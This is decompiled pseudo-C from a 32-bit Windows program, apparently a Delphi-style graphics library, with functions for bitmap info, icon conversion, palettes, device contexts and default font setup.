    *(_WORD *)(a2 + 14) = v9 * v10;
  }
  *(_WORD *)(a2 + 12) = 1;
  result = *(_DWORD *)(a2 + 32);
  if ( result < *(_DWORD *)(a2 + 36) )
    *(_DWORD *)(a2 + 36) = result;
  if ( !*(_DWORD *)(a2 + 20) )
  {
    v7 = sub_421904(*(_DWORD *)(a2 + 4), *(unsigned __int16 *)(a2 + 14), 32);
    result = abs32(*(_DWORD *)(a2 + 8));
    *(_DWORD *)(a2 + 20) = result * v7;
  }
  return result;
}

//----- (00422074) --------------------------------------------------------
int __userpurge sub_422074@<eax>(void *a1@<eax>, int *a2@<edx>, _DWORD *a3@<ecx>, int a4)
{
  int v6; // eax
  int result; // eax
  char v8[14]; // [esp+8h] [ebp-28h] BYREF
  unsigned __int16 v9; // [esp+16h] [ebp-1Ah]
  char v10; // [esp+18h] [ebp-18h]
  int v11; // [esp+1Ch] [ebp-14h]
  int v12; // [esp+28h] [ebp-8h]

  sub_421F90(a1, (int)v8, a4);
  if ( v9 <= 8u )
  {
    if ( v12 )
      v6 = 4 * v12 + 40;
    else
      v6 = 4 * (1 << v9) + 40;
    *a2 = v6;
  }
  else
  {
    *a2 = 40;
    if ( (v10 & 3) != 0 )
      *a2 += 12;
  }
  result = v11;
  *a3 = v11;
  return result;
}
// 422074: using guessed type char var_28[14];

//----- (004220D8) --------------------------------------------------------
bool __userpurge sub_4220D8@<al>(
        LPBITMAPINFO lpbmi@<ecx>,
        HPALETTE hPal@<edx>,
        HBITMAP a3@<eax>,
        int a4,
        LPVOID lpvBits)
{
  unsigned int v9[2]; // [esp-Ch] [ebp-24h] BYREF
  int *v10; // [esp-4h] [ebp-1Ch]
  HDC hdc; // [esp+Ch] [ebp-Ch]
  HPALETTE hPala; // [esp+10h] [ebp-8h]
  bool v13; // [esp+17h] [ebp-1h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  sub_421F90(a3, (int)lpbmi, a4);
  hPala = 0;
  hdc = CreateCompatibleDC(0);
  v10 = &savedregs;
  v9[1] = (unsigned int)&loc_422175;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  if ( hPal )
  {
    hPala = SelectPalette(hdc, hPal, 0);
    RealizePalette(hdc);
  }
  v13 = GetDIBits(hdc, a3, 0, lpbmi->bmiHeader.biHeight, lpvBits, lpbmi, 0) != 0;
  __writefsdword(0, v9[0]);
  v10 = (int *)&loc_42217C;
  if ( hPala )
    SelectPalette(hdc, hPala, 0);
  DeleteDC(hdc);
  return v13;
}

//----- (0042218C) --------------------------------------------------------
int __usercall sub_42218C@<eax>(int result@<eax>)
{
  if ( !result )
    return nullsub_7();
  return result;
}
// 422188: using guessed type int nullsub_7(void);

//----- (00422198) --------------------------------------------------------
BOOL __usercall sub_422198@<eax>(int a1@<eax>, HICON a2@<edx>, char a3@<cl>)
{
  int IconInfo; // eax
  LPBITMAPINFO v6; // esi
  struct _EXCEPTION_REGISTRATION_RECORD *v8; // [esp-18h] [ebp-78h] BYREF
  void *v9; // [esp-14h] [ebp-74h]
  int *v10; // [esp-10h] [ebp-70h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-6Ch] BYREF
  void *v12; // [esp-8h] [ebp-68h]
  int *v13; // [esp-4h] [ebp-64h]
  void *v14; // [esp+0h] [ebp-60h]
  char v15[2]; // [esp+Ch] [ebp-54h] BYREF
  __int16 v16; // [esp+Eh] [ebp-52h]
  int v17; // [esp+14h] [ebp-4Ch]
  int v18; // [esp+18h] [ebp-48h]
  ICONINFO piconinfo; // [esp+1Ch] [ebp-44h] BYREF
  int v20; // [esp+30h] [ebp-30h] BYREF
  char v21[2]; // [esp+36h] [ebp-2Ah] BYREF
  __int16 v22; // [esp+38h] [ebp-28h]
  __int16 v23; // [esp+3Ah] [ebp-26h]
  LPVOID v24; // [esp+3Ch] [ebp-24h]
  LPBITMAPINFO v25; // [esp+40h] [ebp-20h]
  LPVOID lpvBits; // [esp+44h] [ebp-1Ch]
  LPBITMAPINFO lpbmi; // [esp+48h] [ebp-18h]
  int v28; // [esp+4Ch] [ebp-14h] BYREF
  int v29; // [esp+50h] [ebp-10h] BYREF
  int v30; // [esp+54h] [ebp-Ch] BYREF
  int v31; // [esp+58h] [ebp-8h] BYREF
  char v32; // [esp+5Fh] [ebp-1h]
  int savedregs; // [esp+60h] [ebp+0h] BYREF

  v32 = a3;
  sub_402E48(v21, 6, 0);
  sub_402E48(v15, 16, 0);
  IconInfo = GetIconInfo(a2, &piconinfo);
  sub_42218C(IconInfo);
  v13 = &savedregs;
  v12 = &loc_422386;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_422074(piconinfo.hbmMask, &v31, &v29, 2);
  sub_422074(piconinfo.hbmColor, &v30, &v28, 16);
  lpbmi = 0;
  lpvBits = 0;
  v25 = 0;
  v24 = 0;
  v10 = &savedregs;
  v9 = &loc_42235F;
  v8 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v8);
  lpbmi = (LPBITMAPINFO)sub_4079FC(v31);
  lpvBits = sub_4079FC(v29);
  v25 = (LPBITMAPINFO)sub_4079FC(v30);
  v24 = sub_4079FC(v28);
  sub_4220D8(lpbmi, 0, piconinfo.hbmMask, 2, lpvBits);
  sub_4220D8(v25, 0, piconinfo.hbmColor, 16, v24);
  if ( v32 )
  {
    v20 = v29 + v28 + v30 + 22;
    (*(void (__fastcall **)(int, int *))(*(_DWORD *)a1 + 12))(4, &v20);
  }
  v22 = 1;
  v23 = 1;
  (*(void (__fastcall **)(int, char *, struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a1 + 12))(
    6,
    v21,
    v8,
    v9,
    v10,
    ExceptionList);
  v6 = v25;
  v15[0] = v25->bmiHeader.biWidth;
  v15[1] = v25->bmiHeader.biHeight;
  v16 = v25->bmiHeader.biBitCount * v25->bmiHeader.biPlanes;
  v17 = v29 + v28 + v30;
  v18 = 22;
  (*(void (__fastcall **)(int, char *))(*(_DWORD *)a1 + 12))(16, v15);
  v6->bmiHeader.biHeight *= 2;
  (*(void (__fastcall **)(int, LPBITMAPINFO))(*(_DWORD *)a1 + 12))(v30, v25);
  (*(void (__fastcall **)(int, LPVOID))(*(_DWORD *)a1 + 12))(v28, v24);
  (*(void (__fastcall **)(int, LPVOID))(*(_DWORD *)a1 + 12))(v29, lpvBits);
  __writefsdword(0, (unsigned int)v12);
  v14 = &loc_422366;
  sub_402700((int)v25);
  sub_402700((int)v24);
  sub_402700((int)lpbmi);
  sub_402700((int)lpvBits);
  __writefsdword(0, (unsigned int)v12);
  v14 = &loc_42238D;
  DeleteObject(piconinfo.hbmColor);
  return DeleteObject(piconinfo.hbmMask);
}
// 422198: using guessed type int var_8;
// 422198: using guessed type int var_30;

//----- (00422394) --------------------------------------------------------
_DWORD *__usercall sub_422394@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  char v2; // bl
  _DWORD *v3; // esi
  char v5; // [esp-10h] [ebp-18h]

  if ( a2 )
    a1 = (_DWORD *)sub_403864((int)a1, a2, v5);
  v2 = a2;
  v3 = a1;
  sub_403504(a1, 0);
  if ( v2 )
    sub_4038BC(v3);
  return v3;
}
// 42239D: variable 'v5' is possibly undefined
// 4223A2: variable 'a2' is possibly undefined

//----- (004223CC) --------------------------------------------------------
int __usercall sub_4223CC@<eax>(int result@<eax>, int a2@<ecx>)
{
  *(_BYTE *)(result + 32) = 1;
  if ( *(_WORD *)(result + 18) )
    return (*(int (__fastcall **)(int, int))(result + 16))(a2, result);
  return result;
}

//----- (004223E4) --------------------------------------------------------
char __cdecl sub_4223E4(int a1)
{
  if ( !*(_DWORD *)(*(_DWORD *)(a1 - 4) + 32) )
    return (*(int (**)(void))(**(_DWORD **)(a1 - 8) + 28))() ^ 1;
  return !sub_4036C0(*(int **)(*(_DWORD *)(a1 - 4) + 32), (int)off_4206D4)
      || !(*(unsigned __int8 (**)(void))(**(_DWORD **)(a1 - 8) + 24))();
}
// 4206D4: using guessed type int (*off_4206D4[3])();

//----- (0042243C) --------------------------------------------------------
int __usercall sub_42243C@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v2; // eax
  int v4; // [esp-10h] [ebp-1Ch]
  int v6; // [esp-8h] [ebp-14h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v6 = *(_DWORD *)(*(_DWORD *)a1 + 48);
  v4 = *(_DWORD *)(*(_DWORD *)a1 + 68);
  LOBYTE(v2) = sub_4223E4((int)&savedregs);
  return (*(int (__fastcall **)(int, const char *, int, int, int, int))(*(_DWORD *)a2 + 8))(v2, "Data", v4, a1, v6, a1);
}
// 422470: variable 'v2' is possibly undefined

//----- (00422488) --------------------------------------------------------
char __usercall sub_422488@<al>(int a1@<eax>, int a2@<edx>)
{
  int v4; // edi
  bool v5; // al
  __int64 v7; // rax
  unsigned int v8; // eax
  bool v9; // al
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp+Ch] [ebp-2Ch] BYREF
  __int64 v12; // [esp+10h] [ebp-28h] BYREF
  void *v13; // [esp+18h] [ebp-20h]
  int *v14; // [esp+1Ch] [ebp-1Ch]
  void *v15; // [esp+20h] [ebp-18h]
  _DWORD *v16; // [esp+2Ch] [ebp-Ch]
  _DWORD *v17; // [esp+30h] [ebp-8h]
  bool v18; // [esp+37h] [ebp-1h]
  int savedregs; // [esp+38h] [ebp+0h] BYREF

  v5 = 0;
  if ( a2 )
  {
    v4 = sub_40347C(a1);
    if ( v4 == sub_40347C(a2) )
      v5 = 1;
  }
  v18 = v5;
  if ( (*(unsigned __int8 (**)(void))(*(_DWORD *)a1 + 28))() || (*(unsigned __int8 (**)(void))(*(_DWORD *)a2 + 28))() )
  {
    return (*(unsigned __int8 (**)(void))(*(_DWORD *)a1 + 28))()
        && (*(unsigned __int8 (**)(void))(*(_DWORD *)a2 + 28))();
  }
  else if ( v18 )
  {
    v17 = sub_403504(&off_417DB0, 1);
    v14 = &savedregs;
    v13 = &loc_4225C2;
    HIDWORD(v12) = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&v12 + 4);
    (*(void (__stdcall **)(_DWORD))(*(_DWORD *)a1 + 68))(HIDWORD(v12));
    v16 = sub_403504(&off_417DB0, 1);
    HIDWORD(v12) = &savedregs;
    LODWORD(v12) = &loc_4225A5;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *))(*(_DWORD *)a2 + 68))(
      ExceptionList,
      &loc_4225A5,
      &savedregs);
    v12 = sub_41AAD4((int)v17);
    v7 = sub_41AAD4((int)v16);
    v9 = 0;
    if ( v7 == v12 )
    {
      v8 = sub_41AAD4((int)v17);
      if ( (unsigned __int8)sub_407A58((_DWORD *)v17[1], (_DWORD *)v16[1], v8) )
        v9 = 1;
    }
    v18 = v9;
    __writefsdword(0, (unsigned int)v13);
    v15 = &loc_4225AC;
    sub_403534(v16);
    __writefsdword(0, (unsigned int)v13);
    v15 = &loc_4225C9;
    sub_403534(v17);
  }
  return v18;
}
// 417DB0: using guessed type int (*off_417DB0)();

//----- (004225D4) --------------------------------------------------------
int sub_4225D4()
{
  return 0;
}

//----- (004225D8) --------------------------------------------------------
char __usercall sub_4225D8@<al>(int a1@<eax>)
{
  return *(_BYTE *)(a1 + 33);
}

//----- (004225DC) --------------------------------------------------------
_DWORD *__usercall sub_4225DC@<eax>(int a1@<eax>, char *a2@<edx>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-14h] BYREF
  void *v5; // [esp-8h] [ebp-10h]
  int *v6; // [esp-4h] [ebp-Ch]
  void *v7; // [esp+0h] [ebp-8h]
  _DWORD *v8; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v8 = sub_41AF50((int)&off_417CC0, 1, a2, 32);
  v6 = &savedregs;
  v5 = &loc_422624;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a1 + 84))(ExceptionList);
  __writefsdword(0, (unsigned int)v5);
  v7 = &loc_42262B;
  return sub_403534(v8);
}
// 417CC0: using guessed type int (*off_417CC0)();

//----- (00422630) --------------------------------------------------------
int __userpurge sub_422630@<eax>(int result@<eax>, int a2@<ebx>, int a3, int a4, char a5, char a6)
{
  int v6; // [esp-4h] [ebp-8h]

  if ( *(_WORD *)(result + 26) )
  {
    LOBYTE(a2) = a6;
    v6 = a2;
    LOBYTE(a2) = a5;
    return (*(int (__stdcall **)(int, int, int, int))(result + 24))(a3, a4, a2, v6);
  }
  return result;
}

//----- (00422658) --------------------------------------------------------
int __usercall sub_422658@<eax>(int a1@<eax>)
{
  return (*(int (**)(void))(*(_DWORD *)a1 + 84))();
}

//----- (00422664) --------------------------------------------------------
_DWORD *__usercall sub_422664@<eax>(int a1@<eax>, char *a2@<edx>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-14h] BYREF
  void *v5; // [esp-8h] [ebp-10h]
  int *v6; // [esp-4h] [ebp-Ch]
  void *v7; // [esp+0h] [ebp-8h]
  _DWORD *v8; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v8 = sub_41AF50((int)&off_417CC0, 1, a2, 0xFFFF);
  v6 = &savedregs;
  v5 = &loc_4226AF;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a1 + 88))(ExceptionList);
  __writefsdword(0, (unsigned int)v5);
  v7 = &loc_4226B6;
  return sub_403534(v8);
}
// 417CC0: using guessed type int (*off_417CC0)();

//----- (004226C0) --------------------------------------------------------
_BYTE *__usercall sub_4226C0@<eax>(_BYTE *result@<eax>, char a2@<dl>)
{
  if ( a2 != result[33] )
  {
    result[33] = a2;
    return (_BYTE *)(*(int (**)(void))(*(_DWORD *)result + 16))();
  }
  return result;
}

//----- (004226D0) --------------------------------------------------------
int __usercall sub_4226D0@<eax>(int a1@<eax>)
{
  return (*(int (**)(void))(*(_DWORD *)a1 + 88))();
}

//----- (004226DC) --------------------------------------------------------
void sub_4226DC()
{
  unsigned int v0[2]; // [esp-18h] [ebp-24h] BYREF
  int *v1; // [esp-10h] [ebp-1Ch]
  unsigned int v2[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v3; // [esp-4h] [ebp-10h]
  int v4; // [esp+0h] [ebp-Ch]
  int v5; // [esp+4h] [ebp-8h]
  int v6; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v5 = sub_418F84(dword_42B78C);
  v3 = &savedregs;
  v2[1] = (unsigned int)&loc_42277A;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  if ( *(_DWORD *)(v5 + 8) - 1 >= 0 )
  {
    v6 = *(_DWORD *)(v5 + 8) - 1;
    do
    {
      v4 = sub_418C80(v5, v6);
      if ( sub_42136C(v4) )
      {
        v1 = &savedregs;
        v0[1] = (unsigned int)&loc_422752;
        v0[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
        __writefsdword(0, (unsigned int)v0);
        sub_422788(v4);
        __writefsdword(0, v0[0]);
        v1 = (int *)&loc_422759;
        sub_4213C8(v4);
      }
      --v6;
    }
    while ( v6 != -1 );
  }
  __writefsdword(0, v2[0]);
  v3 = (int *)&loc_422781;
  sub_418FE8(dword_42B78C);
}
// 42B78C: using guessed type int dword_42B78C;

//----- (00422788) --------------------------------------------------------
void __usercall sub_422788(int a1@<eax>)
{
  HPALETTE v1; // eax
  HDC v2; // ebx
  unsigned int v3[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v4; // [esp-4h] [ebp-Ch]
  int v5; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v5 = a1;
  if ( *(_DWORD *)(a1 + 4) )
  {
    sub_421318(v5);
    v4 = &savedregs;
    v3[1] = (unsigned int)&loc_42281C;
    v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v3);
    if ( *(_DWORD *)(v5 + 92) )
      SelectObject(*(HDC *)(v5 + 4), *(HGDIOBJ *)(v5 + 92));
    v1 = *(HPALETTE *)(v5 + 96);
    if ( v1 )
      SelectPalette(*(HDC *)(v5 + 4), v1, -1);
    v2 = *(HDC *)(v5 + 4);
    sub_421490(v5, 0);
    DeleteDC(v2);
    sub_418F98(dword_42B78C, v5);
    __writefsdword(0, v3[0]);
    v4 = (int *)&loc_422823;
    sub_4213C8(v5);
  }
}
// 42B78C: using guessed type int dword_42B78C;

//----- (00422828) --------------------------------------------------------
int __usercall sub_422828@<eax>(int result@<eax>)
{
  ++*(_DWORD *)(result + 4);
  return result;
}

//----- (0042282C) --------------------------------------------------------
_DWORD *__usercall sub_42282C@<eax>(_DWORD *result@<eax>)
{
  _DWORD *v1; // ebx

  v1 = result;
  if ( result )
  {
    if ( !--result[1] )
    {
      (*(void (**)(void))*result)();
      return sub_403534(v1);
    }
  }
  return result;
}

//----- (0042284C) --------------------------------------------------------
_DWORD *__usercall sub_42284C@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi
  _DWORD *result; // eax

  v2 = sub_4038CC(a1, a2);
  v4 = v3;
  v5 = v2;
  sub_403534((_DWORD *)v2[3]);
  result = sub_403524(v5, v4 & 0xFC);
  if ( v4 > 0 )
    return (_DWORD *)sub_4038B4(v5);
  return result;
}
// 422853: variable 'v3' is possibly undefined

//----- (0042287C) --------------------------------------------------------
int __usercall sub_42287C@<eax>(int a1@<eax>)
{
  HICON v2; // eax
  int result; // eax

  v2 = *(HICON *)(a1 + 8);
  if ( v2 )
    DestroyIcon(v2);
  result = 0;
  *(_DWORD *)(a1 + 8) = 0;
  return result;
}

//----- (00422894) --------------------------------------------------------
_DWORD *__usercall sub_422894@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  char v2; // bl
  _DWORD *v3; // edi
  _DWORD *v4; // eax
  char v6; // [esp-10h] [ebp-1Ch]

  if ( a2 )
    a1 = (_DWORD *)sub_403864((int)a1, a2, v6);
  v2 = a2;
  v3 = a1;
  sub_422394(a1, 0);
  *((_BYTE *)v3 + 33) = 1;
  v4 = sub_403504(&off_42081C, 1);
  v3[10] = v4;
  sub_422828((int)v4);
  if ( v2 )
    sub_4038BC(v3);
  return v3;
}
// 42289E: variable 'v6' is possibly undefined
// 4228A3: variable 'a2' is possibly undefined
// 42081C: using guessed type int (*off_42081C)();

//----- (004228E8) --------------------------------------------------------
_DWORD *__usercall sub_4228E8@<eax>(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi
  _DWORD *result; // eax

  v2 = sub_4038CC(a1, a2);
  v4 = v3;
  v5 = v2;
  sub_42282C((_DWORD *)v2[10]);
  result = sub_418FF4(v5, v4 & 0xFC);
  if ( v4 > 0 )
    return (_DWORD *)sub_4038B4(v5);
  return result;
}
// 4228EF: variable 'v3' is possibly undefined

//----- (00422918) --------------------------------------------------------
_DWORD *__usercall sub_422918@<eax>(int a1@<eax>, int a2@<edx>)
{
  if ( a2 && !sub_4036C0((int *)a2, (int)off_420878) )
    return sub_419020((int *)a1, (int (***)(void))a2);
  if ( a2 )
  {
    sub_422828(*(_DWORD *)(a2 + 40));
    sub_42282C(*(_DWORD **)(a1 + 40));
    *(_DWORD *)(a1 + 40) = *(_DWORD *)(a2 + 40);
  }
  else
  {
    sub_422BF0(a1, 0, 0);
  }
  return (_DWORD *)(*(int (**)(void))(*(_DWORD *)a1 + 16))();
}
// 420878: using guessed type int (*off_420878[3])();

//----- (00422978) --------------------------------------------------------
BOOL __usercall sub_422978@<eax>(HICON a1@<eax>, int a2@<edx>, int *a3@<ecx>)
{
  int v4; // esi
  HICON v6; // eax

  v4 = a2;
  LOBYTE(a2) = 1;
  sub_4214E4(a3, a2);
  v6 = (HICON)sub_4229D0(a1);
  return DrawIconEx(*(HDC *)(v4 + 4), *a3, a3[1], v6, 0, 0, 0, 0, 3u);
}
// 4214E4: using guessed type int __fastcall sub_4214E4(_DWORD, _DWORD);

//----- (004229B8) --------------------------------------------------------
bool __usercall sub_4229B8@<al>(int a1@<eax>)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 40);
  return !*(_DWORD *)(v1 + 8) && !*(_DWORD *)(v1 + 12);
}

//----- (004229D0) --------------------------------------------------------
int __usercall sub_4229D0@<eax>(HICON a1@<eax>)
{
  sub_422A0C(a1);
  return *(_DWORD *)(*((_DWORD *)a1 + 10) + 8);
}

//----- (004229E4) --------------------------------------------------------
int __usercall sub_4229E4@<eax>(int a1@<eax>)
{
  int result; // eax

  result = *(_DWORD *)(*(_DWORD *)(a1 + 40) + 20);
  if ( !result )
    return GetSystemMetrics(12);
  return result;
}

//----- (004229F8) --------------------------------------------------------
int __usercall sub_4229F8@<eax>(int a1@<eax>)
{
  int result; // eax

  result = *(_DWORD *)(*(_DWORD *)(a1 + 40) + 16);
  if ( !result )
    return GetSystemMetrics(11);
  return result;
}

//----- (00422A0C) --------------------------------------------------------
HICON __usercall sub_422A0C@<eax>(HICON result@<eax>)
{
  HICON v1; // esi
  _DWORD *v2; // ebx
  int v3; // [esp+0h] [ebp-14h] BYREF
  unsigned __int16 v4; // [esp+4h] [ebp-10h]
  int v5; // [esp+8h] [ebp-Ch] BYREF

  v1 = result;
  v2 = (_DWORD *)*((_DWORD *)result + 10);
  if ( !v2[2] )
  {
    result = (HICON)v2[3];
    if ( result )
    {
      sub_41AAC0((int)result, 0, 0);
      sub_41ACCC(6, &v3);
      if ( HIWORD(v3) )
      {
        if ( HIWORD(v3) == 1 )
          sub_421C88(v2[3], (HICON *)&v5, v4, v2 + 4, (int *)v1 + 11, 6);
        else
          sub_42166C();
      }
      else
      {
        v5 = dword_42CC18;
      }
      result = (HICON)v5;
      v2[2] = v5;
    }
  }
  return result;
}
// 41ACCC: using guessed type int __fastcall sub_41ACCC(_DWORD, _DWORD);
// 42CC18: using guessed type int dword_42CC18;

//----- (00422A84) --------------------------------------------------------
_DWORD *__usercall sub_422A84@<eax>(_DWORD *result@<eax>)
{
  HICON v1; // esi
  int v2; // ebx
  HICON v3; // eax
  unsigned int v4[6]; // [esp-Ch] [ebp-24h] BYREF
  char v5[6]; // [esp+Eh] [ebp-Ah] BYREF
  _DWORD *v6; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v1 = (HICON)result;
  v2 = result[10];
  if ( !*(_DWORD *)(v2 + 12) )
  {
    if ( !*(_DWORD *)(v2 + 8) )
      sub_42166C();
    v6 = sub_403504(&off_417DB0, 1);
    v4[2] = (unsigned int)&savedregs;
    v4[1] = (unsigned int)&loc_422B11;
    v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v4);
    if ( sub_4229D0(v1) == dword_42CC18 )
    {
      sub_402E48(v5, 6, 0);
      sub_41AD04(6, v5);
    }
    else
    {
      v3 = (HICON)sub_4229D0(v1);
      sub_422198((int)v6, v3, 0);
    }
    __writefsdword(0, v4[0]);
    result = v6;
    *(_DWORD *)(v2 + 12) = v6;
  }
  return result;
}
// 417DB0: using guessed type int (*off_417DB0)();
// 41AD04: using guessed type int __fastcall sub_41AD04(_DWORD, _DWORD);
// 42CC18: using guessed type int dword_42CC18;

//----- (00422B38) --------------------------------------------------------
int __usercall sub_422B38@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v4; // eax
  unsigned int v6[6]; // [esp-Ch] [ebp-24h] BYREF
  char v7[2]; // [esp+Eh] [ebp-Ah] BYREF
  unsigned __int16 v8; // [esp+10h] [ebp-8h]
  void (***v9)(void); // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v9 = (void (***)(void))sub_403504(&off_417DB0, 1);
  v6[2] = (unsigned int)&savedregs;
  v6[1] = (unsigned int)&loc_422BC7;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_41AAD4(a2);
  sub_41AAA0(a2);
  (**v9)();
  v4 = sub_41AAD4((int)v9);
  sub_41ACCC(v4, v9[1]);
  sub_41ACCC(6, v7);
  if ( v8 >= 2u )
    sub_42166C();
  sub_422BF0(a1, 0, (int)v9);
  __writefsdword(0, v6[0]);
  return (*(int (**)(void))(*(_DWORD *)a1 + 16))();
}
// 417DB0: using guessed type int (*off_417DB0)();
// 41ACCC: using guessed type int __fastcall sub_41ACCC(_DWORD, _DWORD);
// 422B38: using guessed type char var_A[2];

//----- (00422BF0) --------------------------------------------------------
_DWORD *__usercall sub_422BF0@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  _DWORD *result; // eax
  unsigned int v7[6]; // [esp-Ch] [ebp-1Ch] BYREF
  _DWORD *v8; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v8 = sub_403504(&off_42081C, 1);
  v7[2] = (unsigned int)&savedregs;
  v7[1] = (unsigned int)&loc_422C30;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v8[2] = a2;
  v8[3] = a3;
  __writefsdword(0, v7[0]);
  sub_422828((int)v8);
  sub_42282C(*(_DWORD **)(a1 + 40));
  result = v8;
  *(_DWORD *)(a1 + 40) = v8;
  return result;
}
// 42081C: using guessed type int (*off_42081C)();

//----- (00422C64) --------------------------------------------------------
int __usercall sub_422C64@<eax>(_DWORD *a1@<eax>)
{
  int v2; // esi
  HICON v3; // eax
  int v4; // edi

  v2 = a1[10];
  if ( *(int *)(v2 + 4) > 1 )
  {
    v3 = CopyIcon(*(HICON *)(v2 + 8));
    sub_422BF0((int)a1, (int)v3, 0);
  }
  v4 = *(_DWORD *)(v2 + 8);
  *(_DWORD *)(v2 + 8) = 0;
  (*(void (**)(void))(*a1 + 16))();
  return v4;
}

//----- (00422CA0) --------------------------------------------------------
int __usercall sub_422CA0@<eax>(int a1@<eax>, int a2@<edx>)
{
  sub_422BF0(a1, a2, 0);
  return (*(int (**)(void))(*(_DWORD *)a1 + 16))();
}

//----- (00422CB8) --------------------------------------------------------
int __usercall sub_422CB8@<eax>(int result@<eax>, int a2@<edx>)
{
  if ( *(_DWORD *)(*(_DWORD *)(result + 40) + 8) )
    return sub_421630();
  *(_DWORD *)(result + 48) = a2;
  return result;
}
// 421630: using guessed type int sub_421630(void);

//----- (00422CD4) --------------------------------------------------------
int __usercall sub_422CD4@<eax>(int result@<eax>, int a2@<edx>)
{
  if ( *(_DWORD *)(*(_DWORD *)(result + 40) + 8) )
    return sub_421630();
  *(_DWORD *)(result + 44) = a2;
  return result;
}
// 421630: using guessed type int sub_421630(void);

//----- (00422CEC) --------------------------------------------------------
int __usercall sub_422CEC@<eax>(_DWORD *a1@<eax>)
{
  int v2; // ebx
  int v3; // eax

  sub_422A84(a1);
  v2 = *(_DWORD *)(a1[10] + 12);
  v3 = sub_41AAD4(v2);
  return sub_41AD04(v3, *(_DWORD *)(v2 + 4));
}
// 41AD04: using guessed type int __fastcall sub_41AD04(_DWORD, _DWORD);

//----- (00422D18) --------------------------------------------------------
int __stdcall sub_422D18(int a1)
{
  return sub_421630();
}
// 421630: using guessed type int sub_421630(void);

//----- (00422D2C) --------------------------------------------------------
int __stdcall sub_422D2C(int a1)
{
  return sub_421630();
}
// 421630: using guessed type int sub_421630(void);

//----- (00422D40) --------------------------------------------------------
HPALETTE sub_422D40()
{
  HDC DC; // ebx
  HPALETTE result; // eax

  DC = GetDC(0);
  nNumerator = GetDeviceCaps(DC, 90);
  ReleaseDC(0, DC);
  result = sub_421918(byte_42B790);
  ho = result;
  return result;
}

//----- (00422D78) --------------------------------------------------------
int __usercall sub_422D78@<eax>(int a1@<ebx>)
{
  HDC DC; // esi
  struct tagTEXTMETRICA v3; // [esp+0h] [ebp-40h] BYREF

  LOBYTE(a1) = 1;
  DC = GetDC(0);
  if ( DC )
  {
    if ( SelectObject(DC, dword_42CC14) && GetTextMetricsA(DC, &v3) )
      LOBYTE(a1) = v3.tmCharSet;
    ReleaseDC(0, DC);
  }
  return a1;
}

//----- (00422DBC) --------------------------------------------------------
char __usercall sub_422DBC@<al>(int a1@<ebx>)
{
  int v1; // eax
  char v2; // bl

  dword_42B514 = -MulDiv(8, nNumerator, 72);
  LOBYTE(v1) = (_BYTE)off_42BA94;
  if ( *((_BYTE *)off_42BA94 + 12) )
  {
    v2 = sub_422D78(a1);
    LOBYTE(v1) = v2 + 0x80;
    if ( v2 == (char)0x80 )
    {
      aMsSansSerif[0] = -2106818033;
      aMsSansSerif[1] = dword_422E1C[1];
      aMsSansSerif[2] = dword_422E1C[2];
      aMsSansSerif[3] = dword_422E1C[3];
      v1 = -MulDiv(9, nNumerator, 72);
      dword_42B514 = v1;
      byte_42B51A = v2;
    }
  }
  return v1;
}
